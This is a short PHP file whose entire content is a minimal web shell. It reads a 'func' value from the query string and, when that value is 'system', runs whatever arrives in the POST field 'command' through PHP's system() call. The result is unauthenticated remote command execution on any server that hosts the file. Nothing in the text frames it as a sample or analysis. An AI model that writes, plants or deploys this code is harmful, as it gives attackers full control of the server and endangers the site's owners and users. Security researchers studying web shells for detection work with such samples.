<?php
$execfunc = $_GET['func'];
if  ($_POST['command'] )  {

	if ($execfunc=="system") {
		system($_POST['command']);
	} 
}
?>